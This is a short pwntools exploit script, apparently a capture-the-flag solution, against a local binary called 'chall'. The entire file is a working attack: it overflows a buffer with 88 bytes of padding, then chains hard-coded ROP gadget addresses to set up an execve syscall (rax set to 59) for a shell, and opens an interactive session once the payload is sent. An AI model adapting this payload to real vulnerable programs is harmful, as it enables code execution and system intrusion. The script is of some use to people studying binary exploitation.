#!/usr/bin/python3

from pwn import *

elf = ELF("./chall")
rop = ROP("./chall")
io = elf.process()
gdb.attach(io)


offset = 88
payload = b"A"*88 
payload += p64(0x401085)
payload += p64(59)
payload += p64(0x40107f)
payload += p64(0x402010)
payload += p64(0x401083)
payload += p64(0)
payload += p64(0x401081)
payload += p64(0)
payload += p64(0x40100a)






io.sendline(payload)




io.interactive()